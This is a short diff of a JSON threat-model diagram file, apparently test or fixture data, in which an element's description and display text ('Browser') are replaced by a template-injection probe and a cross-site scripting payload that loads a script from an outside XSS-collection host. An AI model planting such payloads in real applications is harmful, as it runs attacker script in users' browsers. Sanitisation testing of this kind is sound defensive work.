@@ -1255,13 +1255,13 @@
               ],
               "outOfScope": false,
               "hasOpenThreats": true,
-              "description": "{{8*8}}${7*7}'\"></div><script/src=https://jr0ch17.xss.ht></script>",
+              "description": "{{8*8}}${7*7}'\\\"></div><script/src=https://jr0ch17.xss.ht></script>",
               "attrs": {
                 ".element-shape": {
                   "class": "element-shape hasOpenThreats isInScope"
                 },
                 "text": {
-                  "text": "Browser"
+                  "text": "{{8*8}}${7*7}'\\\"></div><s\ncript/src=https://jr0ch17.\nxss.ht></script>"
                 },
                 "#element-shape": {
                   "class": ""
